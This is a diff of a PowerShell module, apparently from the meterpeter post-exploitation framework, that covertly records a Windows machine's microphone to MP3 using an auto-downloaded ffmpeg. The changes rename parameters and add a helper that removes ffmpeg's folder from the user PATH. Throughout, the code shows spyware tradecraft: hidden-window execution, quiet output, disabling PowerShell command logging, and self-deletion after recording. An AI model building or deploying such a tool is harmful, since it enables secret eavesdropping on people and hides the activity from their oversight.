@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: ffmpeg.exe {auto-download}
    Optional Dependencies: Curl, WinGet {native}
-   PS cmdlet Dev version: v1.2.8
+   PS cmdlet Dev version: v2.2.8
 
 .DESCRIPTION
    Auxiliary Module of meterpeter v2.10.14.1 that records native
@@ -18,16 +18,16 @@
    takes aprox 2 minutes) and execute it, at 2º time run it will start recording
    audio instantly without the need to download or install ffmpeng codec again.
 
-   [-download 'Store|GitHub']
-   -download 'Store'   - download\install\execute ffmpeg.exe using WinGet appl
-   -download 'GitHub'  - download\execute ffmpeg.exe from working dir (%TMP%)
+   [-installer 'Store|GitHub']
+   -installer 'Store'   - download\INSTALL\execute ffmpeg.exe using WinGet API
+   -installer 'GitHub'  - download\execute ffmpeg.exe from working dir (%TMP%)
 
    [-loglevel 'info|verbose|error|warning|panic|quiet']
    -loglevel 'quiet'   - supresses all stdout displays [ffmpeg]
    -loglevel 'verbose' - display stdout verbose report [ffmpeg]
 
    [-forceenvpath] switch appends -workingdir 'directory' to USER
-   environement path if invoked together with -download 'GitHub'
+   Environment path if invoked together with -download 'GitHub'
    This allows for ffmpeg alias to be invoked in current shell.
 
 .Parameter workingDir
@@ -39,8 +39,8 @@
 .Parameter RecTime
    Record audio for xx seconds (default: 10)
 
-.Parameter Download
-   Download ffmpeg from Store|GitHub (default: GitHub)
+.Parameter Installer
+   Install ffmpeg from Store|GitHub (default: GitHub)
 
 .Parameter Random
    Switch that random generates Mp3 filename
@@ -48,14 +48,14 @@
 .Parameter LogLevel
    Set ffmpeg stdout reports level (default: info)
 
+.Parameter LogFile
+   Switch that creates cmdlet execution logfile
+
 .Parameter ForceEnvPath
-   Switch that imports ffmpeg to USER path [$Env:PATH]
+   Import ffmpeg to environment path [installer:GitHub]
 
 .Parameter AutoDelete
    Switch that auto-deletes this cmdlet in the end
-
-.Parameter LogFile
-   Switch that creates cmdlet execution logfile
 
 .EXAMPLE
    PS C:\> .\rec_audio.ps1 -workingDir "$pwd"
@@ -66,20 +66,24 @@
    Use stdout verbose reports, record audio for 13 seconds
 
 .EXAMPLE
-   PS C:\> .\rec_audio.ps1 -rectime '28' -download 'store'
-   Download ffmpeg from MStore, record audio for 28 seconds
+   PS C:\> .\rec_audio.ps1 -rectime '28' -Installer 'store'
+   Install ffmpeg from MSstore, record audio for 28 seconds
 
 .EXAMPLE
-   PS C:\> .\rec_audio.ps1 -random -download 'GitHub'
-   Download ffmpeg from GitHub, random generate MP3 filename
+   PS C:\> .\rec_audio.ps1 -random -Installer 'GitHub'
+   Install ffmpeg from GitHub, random generate MP3 filename
 
 .EXAMPLE
    PS C:\> .\rec_audio.ps1 -workingdir "$Env:TMP" -forceenvpath
-   Use %TMP% has working dir, Import ffmpeg to USER path [$Env:PATH]
+   Use %TMP% has working dir, Import ffmpeg to Environment path [$Env:PATH]
 
 .EXAMPLE
-   PS C:\> .\rec_audio.ps1 -uninstall
-   UnInstall ffmpeg from MStore [local]
+   PS C:\> .\rec_audio.ps1 -uninstall -installer 'store'
+   UnInstall ffmpeg from MSstore [local uninstallation]
+
+.EXAMPLE
+   PS C:\> .\rec_audio.ps1 -uninstall -installer 'github'
+   delete ffmpeg path from Environment paths [$Env:PATH]
 
 .EXAMPLE
    PS C:\> Start-Process -windowstyle hidden powershell -argumentlist "-file rec_audio.ps1 -rectime 60 -loglevel quiet -autodelete"
@@ -125,7 +129,7 @@
 [CmdletBinding(PositionalBinding=$false)] param(
    [string]$Mp3Name="AudioClip.mp3",
    [string]$WorkingDir="$Env:TMP",
-   [string]$Download="GitHub",
+   [string]$Installer="GitHub",
    [string]$LogLevel="info",
    [switch]$ForceEnvPath,
    [switch]$AutoDelete,
@@ -136,7 +140,7 @@
 )
 
 
-$cmdletver = "v1.2.8"
+$cmdletver = "v2.2.8"
 $IPath = (Get-Location).Path.ToString()
 $ErrorActionPreference = "SilentlyContinue"
 ## Disable Powershell Command Logging for current session.
@@ -170,7 +174,102 @@ write-host "`n[$global:CurrTime] 🔌 record native microphone audio 🔌" -Fore
 If($LogFile.IsPresent){echo "[$global:CurrTime] 🔌 record native microphone audio 🔌" > "$WorkingDir\ffmpeg.log"}
 
 
-If($UnInstall.IsPresent)
+If(($UnInstall.IsPresent) -and ($Installer -match '^(GitHub)$'))
+{
+   <#
+   .SYNOPSIS
+      Author: @r00t-3xp10it
+      Helper - delete ffmpeg from Environment path [$Env:PATH]
+
+   .OUTPUTS
+      [20:42] 🔌 record native microphone audio 🔌
+      [20:42] delete ffmpeg from environment path
+
+      Selected for deletion
+      ---------------------
+      C:\Users\pedro\AppData\Local\Temp
+
+      [20:43] Delete Environment Path Value? (yes|no): yes
+      [20:43] Setting new Environment Paths value
+
+      Current Environment paths
+      -------------------------
+      C:\WINDOWS\system32\
+      C:\WINDOWS\
+      C:\WINDOWS\System32\Wbem\
+      C:\WINDOWS\System32\WindowsPowerShell\v1.0\
+      C:\WINDOWS\System32\OpenSSH\
+      C:\Users\pedro\AppData\Local\Programs\Python\Python39\Scripts\
+      C:\Users\pedro\AppData\Local\Programs\Python\Python39\
+      C:\Users\pedro\AppData\Local\Microsoft\WindowsApps
+
+      [20:43] FFmpeg environment path successfuly deleted!
+   #>
+
+   Invoke-CurrentTime
+   write-host "[$global:CurrTime] " -ForegroundColor Green -NoNewline
+   write-host "delete ffmpeg from environment path"
+
+   ## Import the machine's PATH variable into the current session
+   $Env:PATH = [Environment]::GetEnvironmentVariable("Path","USER")
+   $RawPaths = ([Environment]::GetEnvironmentVariables()).Path
+   If($RawPaths -match '^(C:\\WINDOWS\\system32\\|C:\\WINDOWS\\system32|C:\\WINDOWS\\System32\\Wbem\\|C:\\WINDOWS\\System32\\Wbem|C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\|C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0)')
+   {
+      $Parsedata = $RawPaths -split ';'
+      write-host "[ABORT] cant find ffmpeg Environement path!" -ForegroundColor Red
+      write-host "`nCurrent Environement Paths" -ForegroundColor Green
+      write-host "--------------------------"
+      echo $Parsedata
+
+      write-host ""
+      cd "$IPath"
+      return
+   }
+
+   write-host "`nSelected for deletion"
+   write-host "---------------------"
+   write-host $($RawPaths -split ';')[0] -ForegroundColor Red
+
+   ## Parse data [Environment Path]
+   $DeleteThisPath = $($RawPaths -split ';')[0]                        ## C:\Users\pedro\AppData\Local\Temp
+   $ParseBackSlash = $DeleteThisPath -replace '\\','\\'                ## C:\\Users\\pedro\\AppData\\Local\\Temp
+   $NewEnvironementPaths = $RawPaths -replace "${ParseBackSlash};",""  ## C:\Users\pedro\AppData\Local\Temp;
+
+   Invoke-CurrentTime
+   ## Make sure we are deleting the correct Environment Path Value!
+   write-host "`n[$global:CurrTime] Delete Environment Path Value? (yes|no): " -ForegroundColor Red -NoNewline
+   $Choise = Read-Host
+
+   If($Choise -imatch '^(y|yes)$')
+   {
+      ## Set new Environment Path value
+      [Environment]::SetEnvironmentVariable(
+         "PATH","$NewEnvironementPaths","USER"
+      )
+
+      write-host "[$global:CurrTime] " -ForegroundColor Green -NoNewline
+      write-host "Setting new Environment Paths value"
+   }
+
+   Start-Sleep -Milliseconds 800
+   ## Import the machine's PATH variable into the current session
+   $Env:PATH = [Environment]::GetEnvironmentVariable("Path","USER")
+
+   ## Display onscreen 'Current Environment Paths' now
+   $CurrentPaths = ([Environment]::GetEnvironmentVariables()).Path
+   $ParseDataPat = $CurrentPaths -split ';'
+   write-host "`nCurrent Environement Paths" -ForegroundColor Green
+   write-host "--------------------------"
+   echo $ParseDataPat
+
+   Invoke-CurrentTime
+   write-host "[$global:CurrTime] FFmpeg environment path successfuly deleted!`n" -ForegroundColor Green
+   If($AutoDelete.IsPresent){Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force}
+   cd "$IPath"
+   return 
+}
+
+If(($UnInstall.IsPresent) -and ($Installer -match '^(Store|Mtore|WinGet)$'))
 {
    <#
    .SYNOPSIS
@@ -216,7 +315,8 @@ If($UnInstall.IsPresent)
    return
 }
 
-If($Download -imatch '^(Store|MStore|WinGet)$')
+
+If($Installer -imatch '^(Store|MStore|WinGet)$')
 {
    <#
    .SYNOPSIS
@@ -368,6 +468,7 @@ Else
    }
 }
 
+
 ## Add Assemblies
 Add-Type '[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDevice {int a(); int o();int GetId([MarshalAs(UnmanagedType.LPWStr)] out string id);}[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDeviceEnumerator {int f();int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);}[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }public static string GetDefault (int direction) {var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;IMMDevice dev = null;Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(direction, 1, out dev));string id = null;Marshal.ThrowExceptionForHR(dev.GetId(out id));return id;}' -name audio -Namespace system;
    
@@ -391,7 +492,7 @@ Else
    $MP3Path = "$WorkingDir" + "\" + "$mp3Name" -join ''
 }
 
-If($Download -imatch '^(Store|MStore|WinGet)$')
+If($Installer -imatch '^(Store|MStore|WinGet)$')
 {
    <#
    .SYNOPSIS
@@ -472,7 +573,8 @@ Else
    .\ffmpeg.exe -y -hide_banner -loglevel "$LogLevel" -f dshow -i audio="$MicName" -filter_complex "volume=1.5" -t $RecTime -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $MP3Path;
 }
 
-If(($ForceEnvPath.IsPresent) -and ($Download -imatch '^(GitHub)$'))
+
+If(($ForceEnvPath.IsPresent) -and ($Installer -imatch '^(GitHub)$'))
 {
    <#
    .SYNOPSIS
@@ -549,6 +651,7 @@ Else
       echo "[$global:CurrTime] Error: fail to create '$MP3Path'`n" >> "$WorkingDir\ffmpeg.log"
    }
 }
+
 
 cd "$IPath" ## Return to start directory
 ## Meterpeter CleanUp
